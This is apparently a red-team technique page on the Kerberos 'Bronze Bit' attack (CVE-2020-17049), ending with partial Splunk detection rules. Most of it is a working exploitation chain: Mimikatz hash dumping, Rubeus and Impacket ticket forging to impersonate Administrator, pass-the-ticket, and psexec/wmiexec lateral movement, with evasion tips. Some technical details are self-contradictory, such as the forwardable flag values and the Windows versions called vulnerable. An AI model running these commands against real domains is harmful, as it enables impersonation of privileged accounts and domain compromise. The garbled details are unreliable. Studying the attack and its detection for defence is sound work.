# [CA-KERB-008]: Bronze Bit Ticket Signing Bypass

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | CA-KERB-008 |
| **MITRE ATT&CK v18.1** | [T1558 - Steal or Forge Kerberos Tickets](https://attack.mitre.org/techniques/T1558/) |
| **Tactic** | Credential Access |
| **Platforms** | Windows AD (Server 2016-2025) |
| **Severity** | **CRITICAL** |
| **CVE** | CVE-2020-17049 |
| **Technique Status** | ACTIVE (Pre-Patch), FIXED (Post-Feb 8, 2021 Enforcement) |
| **Last Verified** | 2024-12-15 |
| **Affected Versions** | Server 2016, 2019, 2022, 2025 (pre-patch) |
| **Patched In** | February 8, 2021 (Full Enforcement); November 10, 2020 (Partial Mitigation) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

**Note:** Sections 6 (Atomic Red Team) omitted because no atomic test exists for Bronze Bit specifically; this technique is domain-specific and not covered in standard atomic libraries. All section numbers have been dynamically renumbered based on applicability.

---

## 2. EXECUTIVE SUMMARY

**Concept:** The Bronze Bit attack (CVE-2020-17049) exploits a cryptographic validation flaw in the Kerberos protocol on Windows Domain Controllers. Specifically, it bypasses the Kerberos Privilege Attribute Certificate (PAC) validation and the Ticket Signing Checksum mechanism used by the KDC to verify that delegated service tickets have not been tampered with. An attacker who controls a service account configured with constrained delegation can modify the **Forwardable flag** (bit) within an encrypted service ticket obtained via S4U2Self, then use the modified ticket in an S4U2Proxy request to impersonate any user—including members of the **Protected Users group** and accounts explicitly marked as "sensitive and cannot be delegated." This attack completely undermines Kerberos delegation security controls and allows lateral movement with the privileges of highly protected accounts.

**Attack Surface:** The vulnerability exists in the S4U2Self/S4U2Proxy exchange on Windows Domain Controllers running unpatched versions prior to February 8, 2021. The attack exploits the fact that service tickets returned by S4U2Self are encrypted with the requesting service account's long-term key; if the attacker controls that key, they can decrypt, modify, and re-encrypt the ticket without the KDC detecting the tampering.

**Business Impact:** An attacker with control of a service account (or machine account) configured for constrained delegation can impersonate domain administrators, members of sensitive groups, and other high-value accounts to access any resource the delegated service is allowed to reach. This enables complete lateral movement and potential domain compromise. The attack is particularly dangerous because it bypasses organizational security policies designed to prevent delegation of sensitive accounts.

**Technical Context:** The attack requires the attacker to already control a service account with constrained delegation configured and to execute the exploit from a location where they can communicate with the Domain Controller. The exploit typically takes seconds to minutes to execute using tools like Rubeus or Impacket. The attack generates Event ID 4769 (Kerberos service ticket requested) entries but these events are often not properly monitored. Detection is challenging because S4U2Proxy requests are legitimate administrative activities in many domains.

### Operational Risk

- **Execution Risk:** **HIGH** - Once a service account is compromised, exploitation is trivial with publicly available tools.
- **Stealth:** **MEDIUM** - The attack generates Kerberos events (4769) but can blend into normal delegation traffic; few organizations monitor S4U2Proxy at scale.
- **Reversibility:** **NO** - Impersonation of Protected Users is immediate; no audit trail indicates the ticket was forged rather than legitimately delegated.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.2.3.3 | "Ensure 'Do not require Kerberos preauthentication' is set to 'Disabled'" |
| **CIS Benchmark** | 5.2.3.4 | "Ensure that the Kerberos delegation is configured to the strictest minimum necessary" |
| **DISA STIG** | V-220975 | Kerberos service ticket validation; PAC checksums |
| **NIST 800-53** | AC-3 | Access Enforcement - PAC validation is a critical enforcement mechanism |
| **NIST 800-53** | IA-2 | Authentication - Kerberos delegation bypasses multi-factor controls |
| **GDPR** | Art. 32 | Security of Processing - Cryptographic controls must prevent unauthorized access |
| **DORA** | Art. 9 | Protection and Prevention - Cloud/AD authentication security |
| **NIS2** | Art. 21 | Cyber Risk Management Measures - Authentication system integrity |
| **ISO 27001** | A.9.2.3 | Management of Privileged Access Rights - delegation controls |
| **ISO 27005** | Risk Scenario | Compromise of Authentication Mechanism (Kerberos delegation) |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:**
- Control of a service account or machine account configured for constrained delegation (`msDS-AllowedToDelegateTo` attribute set on the account)
- OR: Control of any account with `MachineAccountQuota > 0` to create and configure a machine account for constrained delegation
- Network access to port 88/TCP (Kerberos KDC) on Domain Controllers
- Ability to read the service account's NTLM hash or AES key (via Mimikatz, LSASS dump, or AD enumeration if account controls itself via RBCD)

**Required Access:**
- Network-level access to Domain Controller Kerberos service (port 88/TCP)
- For exploitation: control of the service account or its password

**Supported Versions:**

| Version | Status | Notes |
|---|---|---|
| **Windows Server 2016** | VULNERABLE | No ticket signature validation on S4U2Self |
| **Windows Server 2019** | VULNERABLE | No ticket signature validation on S4U2Self |
| **Windows Server 2022** | PARTIAL | November 2020 patch provides partial mitigation (ticket checksum); February 2021 enforcement provides full fix |
| **Windows Server 2025** | VULNERABLE (Pre-Patch) | Inherits 2022 behavior; fully patched with February 2021+ updates |

**Tools:**
- [Rubeus (SpecterOps)](https://github.com/GhostPack/Rubeus) - Version 1.6.4+ (includes /bronzebit flag)
- [Impacket getST.py](https://github.com/fortra/impacket) - Version 0.9.24+ (includes -force-forwardable)
- [Mimikatz](https://github.com/gentilkiwi/mimikatz) - Any version (for credential harvesting)
- [PowerView](https://github.com/PowerSharpPack/PowerView) - For delegation enumeration

**Other Requirements:**
- PowerShell 5.0+ or PowerShell 7.0+ (depending on environment)
- Administrator rights on a compromised machine (to extract service account credentials) OR plaintext credentials of the service account

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### 4.1 Windows PowerShell Reconnaissance

#### Step 1: Identify Constrained Delegation Accounts

```powershell
# Enumerate all accounts configured for constrained delegation
Get-ADObject -Filter {msDS-AllowedToDelegateTo -like '*'} -Properties msDS-AllowedToDelegateTo | Select-Object Name, msDS-AllowedToDelegateTo

# Alternative: Check for accounts with delegation enabled
Get-ADComputer -Filter * -Properties msDS-AllowedToDelegateTo | Where-Object {$_.msDS-AllowedToDelegateTo -ne $null} | Select-Object Name, msDS-AllowedToDelegateTo

# Find accounts in Protected Users group
Get-ADGroupMember -Identity "Protected Users" -Recursive | Select-Object Name, ObjectClass
```

**What to Look For:**
- Accounts with `msDS-AllowedToDelegateTo` populated = potential targets for Bronze Bit
- Service accounts (especially web servers, database servers) = high-value targets
- Protected Users group members = accounts that CANNOT be normally delegated but CAN be impersonated via Bronze Bit

**Version Note:** Commands work identically on Server 2016-2025; delegation settings are AD-level attributes, not version-specific.

#### Step 2: Verify Current Patch Status

**Command (Server 2016-2019):**
```powershell
# Check if November 2020 patch (KB4598347) is installed
Get-Hotfix | Where-Object {$_.HotFixID -eq "KB4598347"}

# Check if February 2021 patch (KB5009645) is installed
Get-Hotfix | Where-Object {$_.HotFixID -eq "KB5009645"}

# Check patch history
Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name CurrentBuildNumber
```

**Command (Server 2022+):**
```powershell
# Check Windows Update history for Kerberos security updates
Get-WmiObject -Class Win32_QuickFixEngineering | Where-Object {$_.Description -match "Kerberos|Authentication"} | Select-Object HotFixID, Description, InstalledOn
```

**Expected Output (If Secure):**
```
HotFixID   Description                 InstalledOn
--------   -----------                 -----------
KB5009645  Security Update             2021-02-09
```

**What to Look For:**
- **Pre-November 2020**: No patches = fully vulnerable
- **November 2020 - February 2021**: Partial patches = vulnerable but with reduced attack surface
- **Post-February 2021**: Full patches applied = protected against Bronze Bit if KDC enforcement is enabled

#### Step 3: Check Kerberos Token Validation Settings (DC Only)

**Command (All Versions):**
```powershell
# On a Domain Controller: check Kerberos encryption configuration
Get-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Lsa\Kerberos\Parameters' -Name MaxTokenSize, KdcSupportedEncryptionTypes

# Check if the DC enforces Ticket Signature validation
auditpol /get /subcategory:"Kerberos Service Ticket Operations"
```

**What to Look For:**
- `KdcSupportedEncryptionTypes`: Should include AES (types 17, 18) and NOT be limited to RC4 (type 23)
- Audit policy: Should show "Kerberos Service Ticket Operations" enabled

#### Step 4: Check for S4U2Proxy Abuse (Hunt for Bronze Bit)

```powershell
# Search Security Event Log for S4U2Proxy requests (Event 4769 with specific attributes)
# This requires parsing Event XML; example for PowerShell v5+

$Events = Get-WinEvent -LogName Security -FilterXPath "*[System[(EventID=4769)]]" -MaxEvents 1000 -ErrorAction SilentlyContinue

foreach ($Event in $Events) {
    $XML = [xml]$Event.ToXml()
    $Data = $XML.Event.EventData.Data
    
    # Look for S4U2Proxy indicators:
    # - TicketOptions contains 0x00000000 (no forwardable flag in legitimate S4U2Self response)
    # - But ticket IS used in proxy request (indicates modification)
    # - Requestor is a service account, target is Protected User
    
    $TicketOptions = ($Data | Where-Object {$_.Name -eq "TicketOptions"}).'#text'
    $RequestorName = ($Data | Where-Object {$_.Name -eq "Account Name"}).'#text'
    $ServiceName = ($Data | Where-Object {$_.Name -eq "Service Name"}).'#text'
    
    if ($TicketOptions -and $ServiceName -like "*krbtgt*") {
        Write-Host "Suspicious S4U2Proxy detected: Requestor=$RequestorName, Service=$ServiceName, Flags=$TicketOptions"
    }
}
```

**What to Look For:**
- Event 4769 generated from service accounts with S4U2Proxy requests
- TicketOptions containing the forwardable flag when shouldn't be present normally
- Patterns of a single service account impersonating multiple Protected Users

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Rubeus S4U with Bronze Bit Flag (Windows)

**Supported Versions:** Server 2016-2025 (pre-patch)

#### Step 1: Obtain or Confirm Service Account Credentials

**Objective:** Secure the NTLM hash or AES key of the target service account configured for constrained delegation.

**Prerequisites:**
- Local administrative access on a machine to run Mimikatz, OR
- Plaintext credentials of the service account, OR
- Access to the account's NTLM hash (from AD dump via LDAP/DCSync)

**Command (Extract via Mimikatz on Compromised Server):**
```powershell
# Run Mimikatz with elevated privileges
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Look for the target service account's NTLM hash in output
# Example output: svc_IIS:1001:HASH_VALUE
```

**Command (Extract via ADConnect/HYBRID):**
```powershell
# If Azure AD Connect service account is compromised:
# Extract from registry (ServicePassword stored encrypted)
Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\AD Sync\Instances\MS SQL Server\...' -Name ServicePassword
```

**Expected Output:**
```
svc_WebServer       NTLM: 8846f7eaee8fb117ad06bdd830b7586c
svc_WebServer       AES256: f1234567890abcdef...
```

**What This Means:**
- NTLM hash = Service account's password hash (RC4 encryption key for Kerberos)
- AES256 = Stronger long-term key (preferred by modern Kerberos)

#### Step 2: Obtain TGT for the Service Account

**Objective:** Acquire a Ticket-Granting Ticket (TGT) for the service account. This TGT will be used to request forwardable tickets via S4U2Self.

**Command (Using Rubeus - Hash-Based):**
```powershell
# Obtain TGT using the service account's NTLM hash
.\Rubeus.exe asktgt /user:svc_WebServer /domain:contoso.com /hash:8846f7eaee8fb117ad06bdd830b7586c /nowrap

# Output will show:
# [*] Action: Ask for Kerberos TGT
# [*] Using hash: 8846f7eaee8fb117ad06bdd830b7586c
# [+] TGT for svc_WebServer acquired
# [+] base64(ticket.kirbi) = doIE+jCCBP...
```

**Command (Using Rubeus - Password-Based):**
```powershell
# Obtain TGT using plaintext password
.\Rubeus.exe asktgt /user:svc_WebServer /domain:contoso.com /password:"P@ssw0rd!123" /nowrap
```

**Command (Using Impacket from Linux):**
```bash
# Get TGT for service account
python3 getTGT.py -hashes :8846f7eaee8fb117ad06bdd830b7586c contoso.com/svc_WebServer

# Ticket saved to svc_WebServer.ccache
```

**Expected Output:**
```
[+] Saving ticket in svc_WebServer.ccache
```

**What This Means:**
- TGT is now cached and can be used for further Kerberos exchanges
- The TGT proves the KDC recognizes the service account as legitimate

**OpSec & Evasion:**
- TGT requests (AS-REQ) generate Event 4768 on the DC; less suspicious than S4U2Proxy events if analyzing logs
- Store TGT in memory only (`/nowrap` flag); don't write to disk if possible
- Timing: Perform during high Kerberos activity (morning logons) to blend in

#### Step 3: Request Forwardable Service Ticket via S4U2Self

**Objective:** Use S4U2Self to request a service ticket to the service account itself, on behalf of a target user (preferably a Protected User like Administrator). This ticket will initially NOT have the forwardable flag set (due to delegation restrictions or Protected User status), but we will modify it in the next step.

**Command (Request Ticket for Administrator via S4U2Self):**
```powershell
# Request S4U2Self ticket for Administrator on the delegated service
# Parameters: /ticket = TGT from Step 2, /impersonateuser = target user, /msdsspn = delegated SPN

.\Rubeus.exe s4u /ticket:doIE+jCCBP... /impersonateuser:Administrator /msdsspn:cifs/fileserver.contoso.com /nowrap

# Expected output:
# [*] Attempting S4U2self for user 'Administrator'
# [*] Requesting service ticket to cifs/fileserver.contoso.com as Administrator
# [+] Service Ticket for Administrator obtained
# [+] base64(ticket.kirbi) = doIFAjCCBP...
# [!] WARNING: Ticket is NOT forwardable (Protected User / Delegation Restrictions)
```

**Command (Server 2022 - Partial Patch Behavior):**
```powershell
# On Server 2022 with November 2020 patch:
# The ticket will have a Ticket Signature Checksum that prevents tampering
# Attempting to modify the ticket will invalidate the checksum

.\Rubeus.exe s4u /ticket:doIE+jCCBP... /impersonateuser:Administrator /msdsspn:cifs/fileserver.contoso.com /bronze /nowrap

# Output:
# [-] Ticket Signature Checksum validation failed (post-patch)
# [-] This may indicate a patched DC; Bronze Bit attack will fail
```

**Expected Output (Pre-Patch):**
```
[+] Service Ticket obtained (NOT forwardable)
[+] Ticket Flags: 0x40000000 (Forwardable NOT set)
```

**What This Means:**
- Service ticket contains user's authorization data (PAC) but marked as non-forwardable
- This ticket alone cannot be used for S4U2Proxy delegation (which requires forwardable flag)
- Post-patch: Ticket checksum prevents the next step (Bronze Bit modification)

**OpSec & Evasion:**
- S4U2Self requests are normal in delegated environments; less suspicious than S4U2Proxy
- Event 4769 generated but typically not alerted on

**Troubleshooting:**
- **Error:** `KDC_ERR_BADOPTION` - Delegation not configured for this account
  - **Cause:** Account does not have `msDS-AllowedToDelegateTo` attribute set
  - **Fix:** Verify account delegation configuration: `Get-ADObject -Filter {Name -eq "svc_WebServer"} -Properties msDS-AllowedToDelegateTo`
  
- **Error:** `KDC_ERR_BADMATCH` - User is protected from delegation
  - **Cause:** Target user (Administrator) is in Protected Users group
  - **Fix (Pre-Patch):** Continue to Step 4; this is exactly the condition for Bronze Bit
  - **Fix (Post-Patch):** Attack fails; DC rejects the modified ticket

#### Step 4: Modify Ticket Forwardable Flag (Bronze Bit Exploitation)

**Objective:** This is the core of the Bronze Bit attack. We decrypt the service ticket with the service account's key, flip the forwardable bit in the ticket flags, and re-encrypt. This tricks the KDC into believing the ticket is delegatable even though it was marked non-forwardable.

**Command (Automatic with Rubeus /bronzebit):**
```powershell
# Rubeus automatically performs the modification internally
# The /bronzebit flag tells Rubeus to:
# 1. Decrypt the ticket from Step 3
# 2. Set the forwardable flag (0x40000000)
# 3. Re-encrypt the ticket
# 4. Use the modified ticket in S4U2Proxy

.\Rubeus.exe s4u /ticket:doIE+jCCBP... /impersonateuser:Administrator /msdsspn:cifs/fileserver.contoso.com /bronzebit /nowrap

# Output:
# [*] Performing Bronze Bit modification
# [+] Forwardable flag set successfully
# [+] Modified ticket ready for S4U2Proxy
```

**Command (Manual - Impacket getST.py with -force-forwardable):**
```bash
# On Linux: Impacket's getST.py automatically handles the modification with the flag
python3 getST.py -spn "cifs/fileserver.contoso.com" \
  -impersonate "Administrator" \
  -force-forwardable \
  -hashes :8846f7eaee8fb117ad06bdd830b7586c \
  contoso.com/svc_WebServer

# Output:
# [-] Kerberos SessionError: KDC_ERR_BADOPTION (on patched DC)
# OR
# [+] Saving ticket in Administrator.ccache (on vulnerable DC)
```

**Expected Output (Vulnerable DC):**
```
[+] Forwardable flag successfully modified
[+] Ticket ready for delegation to target service
```

**What This Means:**
- Ticket now appears forwardable to the KDC
- Ticket flags changed from 0x40000000 to 0x40800000 (forwardable bit = 0x40000000 added)
- Modified ticket can now be used for S4U2Proxy

**OpSec & Evasion:**
- **Critical**: On patched DCs (Feb 2021+), the KDC validates the Ticket Signature Checksum and will reject the modified ticket
- The modification happens in-memory; no disk artifacts (if using `/nowrap`)
- Evasion: Perform this entire operation in a single Rubeus command chain to minimize network events

**Troubleshooting:**
- **Error (Server 2022+):** `KRB_AP_ERR_MODIFIED` - Ticket signature validation failed
  - **Cause:** DC has the full patch applied (Feb 2021+); ticket checksum prevents tampering
  - **Fix (Exploitation):** Attacks fails; only option is to wait for a truly forwardable ticket (requires user to authenticate to delegated service)
  - **Fix (Mitigation):** This error indicates the defense is working correctly

#### Step 5: Use Modified Ticket for S4U2Proxy (Final Impersonation)

**Objective:** Use the modified (forwardable) ticket in an S4U2Proxy request to the KDC, requesting a service ticket to the target service (CIFS/fileserver) as the impersonated user (Administrator). The KDC will check the forwardable flag, see it's set, verify the delegation is allowed, and issue the final impersonation ticket.

**Command (Chained S4U with Bronze Bit):**
```powershell
# Perform S4U2Proxy using the modified ticket from Step 4
# The /impersonateuser and /msdsspn refer to the final target
# The /ticket is the modified forwardable ticket

.\Rubeus.exe s4u /ticket:doIE+jCCBP... /impersonateuser:Administrator /msdsspn:cifs/fileserver.contoso.com /bronzebit /ptt

# Output:
# [*] Performing S4U2Proxy delegation
# [*] Sending modified ticket to KDC
# [*] Requesting service ticket for Administrator to cifs/fileserver.contoso.com
# [+] S4U2Proxy successful
# [+] Service Ticket for Administrator to CIFS/fileserver obtained
# [+] Ticket injected into LSASS (ptt = pass-the-ticket)
```

**Expected Output (Vulnerable DC):**
```
[+] Service Ticket for Administrator (Administrator@contoso.com) to cifs/fileserver.contoso.com obtained
[+] Ticket successfully imported into LSASS
```

**What This Means:**
- Attacker now has a valid service ticket as Administrator
- Ticket can be used to authenticate to the fileserver as Administrator
- Lateral movement achieved; can now read files, execute code, etc., with Administrator privileges

**OpSec & Evasion:**
- S4U2Proxy requests (Event 4769) may be monitored; but if delegation is legitimately configured, this blends in
- Ticket injection via `/ptt` loads the ticket into LSASS memory (similar to legitimate Kerberos usage)
- Mitigation: This step fails on patched DCs because the modified ticket is rejected

**Troubleshooting:**
- **Error:** `KDC_ERR_BADOPTION` - S4U2Proxy not allowed for this delegation
  - **Cause:** Service account not configured for delegation to this target SPN
  - **Fix:** Verify `msDS-AllowedToDelegateTo` includes the target: `Get-ADObject -Filter {Name -eq "svc_WebServer"} -Properties msDS-AllowedToDelegateTo`
  
- **Error:** `KRB_AP_ERR_MODIFIED` (Server 2022+) - Ticket signature check failed
  - **Cause:** DC has Feb 2021+ patch; ticket checksum validation prevents tampering
  - **Fix:** Attack fails; DC is protected against Bronze Bit

#### Step 6: Verify Impersonation and Perform Lateral Movement

**Objective:** Confirm that the injected ticket allows access as the impersonated user, and use it for lateral movement.

**Command (Test Ticket):**
```powershell
# List current tickets in LSASS
.\Rubeus.exe triage

# Expected output showing Administrator's ticket for CIFS/fileserver.contoso.com

# Now use the ticket to access the fileserver
net use \\fileserver.contoso.com\C$ /user:contoso.com\Administrator

# Or via PowerShell:
$cred = Get-Credential  # Will use injected ticket for auth
Get-ChildItem \\fileserver.contoso.com\C$

# Or via Invoke-Command (if RPC/WMI is allowed):
Invoke-Command -ComputerName fileserver.contoso.com -ScriptBlock {whoami}
```

**Expected Output (Successful Impersonation):**
```
contoso.com\Administrator

C:\ (fileserver)
    Directory: \\fileserver.contoso.com\C$

Mode                LastWriteTime         Length Name
----                -----                 ------ ----
d-----        2024-01-15     10:30                Windows
d-----        2024-01-15     10:30                Program Files
```

**What This Means:**
- Ticket injection successful
- Lateral movement achieved as high-privileged user
- Can now execute commands, exfiltrate data, or establish persistence

**References & Proofs:**
- [NetSPI Bronze Bit Attack Explanation](https://www.netspi.com/blog/technical-blog/network-pentesting/cve-2020-17049-kerberos-bronze-bit-theory/)
- [Rubeus GitHub - S4U Documentation](https://github.com/GhostPack/Rubeus)
- [Microsoft CVE-2020-17049 Advisory](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-17049)

---

### METHOD 2: Impacket getST (Linux/Cross-Platform)

**Supported Versions:** Server 2016-2025 (pre-patch)

#### Step 1: Set Up Impacket on Linux

**Objective:** Install and configure Impacket tools for Bronze Bit exploitation on a Linux attacker machine.

**Command:**
```bash
# Install Impacket (if not already installed)
pip3 install impacket

# Verify installation
python3 -c "import impacket; print(impacket.__version__)"

# Expected output: 0.9.24 or later (must include -force-forwardable support)
```

**What to Look For:**
- Version 0.9.24+: Includes `-force-forwardable` flag for Bronze Bit exploitation
- Older versions: Will not work for Bronze Bit; use Rubeus instead

#### Step 2: Obtain Service Account Credentials

**Objective:** Same as METHOD 1 Step 1, but on Linux: Convert NTLM hash to usable format.

**Command (NTLM Hash-Based):**
```bash
# Create ccache from NTLM hash (using getTGT.py)
python3 /usr/share/doc/python3-impacket/examples/getTGT.py \
  -hashes :8846f7eaee8fb117ad06bdd830b7586c \
  contoso.com/svc_WebServer

# Output:
# Impacket v0.9.24
# [*] Saving ticket in svc_WebServer.ccache
```

**Command (Keytab-Based - if available):**
```bash
# If a keytab file is available (extracted from AD Connect or similar)
python3 /usr/share/doc/python3-impacket/examples/getTGT.py \
  -k -no-pass contoso.com/svc_WebServer

# Requires: /etc/krb5.conf configured for contoso.com
```

**Expected Output:**
```
[*] Saving ticket in svc_WebServer.ccache
```

**What This Means:**
- TGT cached in svc_WebServer.ccache
- Ready for getST.py to request service tickets

#### Step 3: Request Forwardable Service Ticket via getST

**Objective:** Request a service ticket using S4U2Self with the `-force-forwardable` flag to automatically perform the Bronze Bit modification.

**Command (Basic getST with Force-Forwardable):**
```bash
# Request forwardable service ticket for Administrator
python3 /usr/share/doc/python3-impacket/examples/getST.py \
  -spn "cifs/fileserver.contoso.com" \
  -impersonate "Administrator" \
  -force-forwardable \
  -k -no-pass contoso.com/svc_WebServer

# Output (vulnerable DC):
# Impacket v0.9.24
# [*] Impersonating Administrator for service ticket (cifs/fileserver.contoso.com)
# [+] Administrator.ccache saved
```

**Command (Using NTLM Hash instead of Keytab):**
```bash
python3 /usr/share/doc/python3-impacket/examples/getST.py \
  -spn "cifs/fileserver.contoso.com" \
  -impersonate "Administrator" \
  -force-forwardable \
  -hashes :8846f7eaee8fb117ad06bdd830b7586c \
  -dc-ip 192.168.1.10 \
  contoso.com/svc_WebServer

# Output:
# [+] Administrator.ccache saved
```

**Expected Output (Vulnerable DC):**
```
[+] Saving ticket in Administrator.ccache
[*] Ticket ready for use with psexec, wmiexec, etc.
```

**What This Means:**
- Service ticket for Administrator obtained
- Bronze Bit modification performed automatically (flag set by `-force-forwardable`)
- Ticket saved as Administrator.ccache

**OpSec & Evasion:**
- Impacket tools are slower than Rubeus; more network traffic over time
- Use `-debug` for verbose output (helps troubleshoot but increases SIEM alerts)
- Run from a compromised internal Linux box or phishing-delivered Linux container

**Troubleshooting (Server 2022+):**
- **Error:** `KDC_ERR_BADOPTION` (pre-patch)
  - **Cause:** Delegation not configured properly
  - **Fix:** Verify SPN in `-spn` matches `msDS-AllowedToDelegateTo` on service account
  
- **Error:** `KRB_AP_ERR_MODIFIED` (post-patch)
  - **Cause:** DC has Feb 2021+ patch; ticket signature checksum validation prevents Bronze Bit
  - **Fix:** Attack fails; DC is protected

#### Step 4: Use Ticket for Lateral Movement

**Objective:** Authenticate to the target service using the impersonated Administrator ticket.

**Command (psexec with Impacket):**
```bash
# Execute commands on fileserver as Administrator
export KRB5CCNAME=Administrator.ccache

python3 /usr/share/doc/python3-impacket/examples/psexec.py \
  -k -no-pass fileserver.contoso.com

# Output:
# Type help for list of commands
# C:\> whoami
# contoso\Administrator
```

**Command (wmiexec Alternative):**
```bash
export KRB5CCNAME=Administrator.ccache

python3 /usr/share/doc/python3-impacket/examples/wmiexec.py \
  -k -no-pass fileserver.contoso.com

# Output:
# [*] SMB connection on fileserver.contoso.com
# C:\> whoami
# contoso\Administrator
```

**Expected Output:**
```
contoso\Administrator
```

**What This Means:**
- Full lateral movement achieved as Administrator on target server
- Can now execute arbitrary code, read sensitive files, or establish persistence

**References & Proofs:**
- [Impacket GitHub - getST Documentation](https://github.com/fortra/impacket/blob/master/examples/getST.py)
- [NetSPI Bronze Bit Practical Exploitation](https://www.netspi.com/blog/technical-blog/network-pentesting/cve-2020-17049-kerberos-bronze-bit-attack/)

---

### METHOD 3: Diamond Ticket Hybrid Attack (No Service Account Compromise Required)

**Supported Versions:** Server 2016-2025 (pre-patch); requires additional constraints

**Prerequisites Relaxed:** If you cannot compromise a service account directly, you can use the "Diamond Ticket" technique (discovered by Charlie Clark, Andrew Schwartz) combined with Bronze Bit. This requires:
- Control of ANY user account in the domain (low-privileged user OK)
- OR: Control of a computer account (via `MachineAccountQuota` abuse)

#### Step 1: Obtain User's TGT via tgtdeleg

**Objective:** Use the Kerberos GSS-API `tgtdeleg` feature to trick the system into issuing a usable (impersonatable) TGT for the current user without requiring their plaintext password.

**Command:**
```powershell
# Request a TGT for the current user using tgtdeleg
# (Works even from a low-privileged user)
.\Rubeus.exe tgtdeleg /nowrap

# Output:
# [*] Action: Request Fake Delegation TGT (current user)
# [*] Initializing Kerberos GSS-API for delegation
# [+] TGT for lowpriv_user obtained
# [+] base64(ticket.kirbi) = doIE+jCCBP...
```

**What This Means:**
- TGT obtained without needing plaintext password
- TGT is marked as delegatable (forwardable flag set)
- Can be used for S4U2Self even if the user account doesn't normally support it

#### Step 2: Use S4U2Self to Request Ticket to Arbitrary Service

**Objective:** Use S4U2Self with the obtained TGT to request a service ticket to any service the attacker wants to target.

**Command:**
```powershell
# Request service ticket using S4U2Self
# Target a high-value account (Administrator) via Bronze Bit

.\Rubeus.exe s4u /ticket:doIE+jCCBP... /impersonateuser:Administrator /msdsspn:cifs/fileserver.contoso.com /bronzebit /nowrap
```

**What This Means:**
- Combines low-privilege account access with Bronze Bit modification
- Allows impersonation without compromising service account
- Effective if constrained delegation is overly permissive

**References & Proofs:**
- [Charlie Clark - Constrained Delegation Bypass](https://www.insomni'hack.ch) (Insomni'hack 2022 talk)

---

## 6. TOOLS & COMMANDS REFERENCE

### [Rubeus - SpecterOps](https://github.com/GhostPack/Rubeus)

**Version:** 1.6.4+  
**Minimum Version:** 1.5.0 (includes S4U with /bronzebit flag)  
**Supported Platforms:** Windows (PowerShell, cmd.exe)

**Installation:**
```powershell
# Download from GitHub releases
Invoke-WebRequest -Uri "https://github.com/GhostPack/Rubeus/releases/download/v1.6.4/Rubeus.exe" -OutFile Rubeus.exe

# Verify SHA256 hash for authenticity (check GitHub releases)
Get-FileHash Rubeus.exe
```

**Usage (Full Exploitation Chain):**
```powershell
# 1. Obtain TGT
.\Rubeus.exe asktgt /user:svc_WebServer /domain:contoso.com /hash:8846f7eaee8fb117ad06bdd830b7586c /nowrap

# 2. Request forwardable ticket with Bronze Bit
.\Rubeus.exe s4u /ticket:TICKET_BLOB /impersonateuser:Administrator /msdsspn:cifs/fileserver.contoso.com /bronzebit /ptt

# 3. Verify ticket injection
.\Rubeus.exe triage
```

---

### [Impacket - getST.py](https://github.com/fortra/impacket)

**Version:** 0.9.24+  
**Minimum Version:** 0.9.24 (includes -force-forwardable)  
**Supported Platforms:** Linux, macOS, Windows (Python 3.6+)

**Installation:**
```bash
pip3 install impacket

# Verify version
python3 -c "import impacket; print(impacket.__version__)"
```

**Usage (Exploitation):**
```bash
# Obtain TGT
python3 getTGT.py -hashes :8846f7eaee8fb117ad06bdd830b7586c contoso.com/svc_WebServer

# Request forwardable service ticket (Bronze Bit auto-applied)
python3 getST.py -spn "cifs/fileserver.contoso.com" -impersonate "Administrator" -force-forwardable -k -no-pass contoso.com/svc_WebServer

# Use ticket for lateral movement
export KRB5CCNAME=Administrator.ccache
python3 psexec.py -k -no-pass fileserver.contoso.com
```

---

### [Mimikatz - Credential Extraction](https://github.com/gentilkiwi/mimikatz)

**Version:** Latest (2.2.0-20220519+)  
**Supported Platforms:** Windows (x86, x64)

**Usage (Extract Service Account Hash):**
```powershell
# Extract NTLM hashes from LSASS
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Look for target service account
# Example: svc_WebServer:1001:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
```

---

## 7. SPLUNK DETECTION RULES

### Rule 1: S4U2Proxy Delegation Abuse (Event 4769)

**Rule Configuration:**
- **Required Index:** `wineventlog`
- **Required Sourcetype:** `WinEventLog:Security`
- **Required Fields:** `EventCode`, `TicketOptions`, `Service_Name`, `Account_Name`
- **Alert Threshold:** 1 event (S4U2Proxy by non-service account)
- **Applies To Versions:** All (Server 2016-2025)

**SPL Query:**
```spl
index=wineventlog source=WinEventLog:Security EventCode=4769
| stats count by Account_Name, Service_Name, TicketOptions
| where Account_Name NOT IN ("*$", "svc_*", "krbtgt")
| search TicketOptions="*0x40*"
| eval risk=if(Service_Name="krbtgt*", "HIGH", "MEDIUM")
```

**What This Detects:**
- Event 4769: Kerberos service ticket requested
- Filter: TicketOptions containing 0x40 (forwardable flag)
- Filter: Requestor is NOT a service account (ends with $ or "svc_")
- **Result:** Detects a non-service account requesting forwardable tickets (Bronze Bit indicator)

**Manual Configuration Steps:**
1. Log into Splunk Web → **Search & Reporting**
2. Click **Settings** → **Searches, reports, and alerts**
3. Click **New Alert** → **New Search**
4. Paste the SPL query above
5. Set **Trigger Condition** to: `When count > 0`
6. Configure **Action** → Send email to SOC@company.com
7. Click **Save**

**Source:** [SpecterOps Detection Blog](https://specterops.io)

---

### Rule 2: S4U2Self Ticket for Protected User

**Rule Configuration:**
- **Required Index:** `wineventlog`
- **Required Sourcetype:** `WinEventLog:Security`
- **Required Fields:** `EventCode`, `Account_Name`, `Service_Name`, `User_Name`
- **Alert Threshold:** 1 event
- **Applies To Versions:** All

**SPL Query:**
```spl
index=wineventlog source=WinEventLog:Security EventCode=4769
| lookup protected_users.csv username AS User_Name OUTPUT is_protected
| where is_protected=true AND Account_Name IN ("svc_*", "*$")
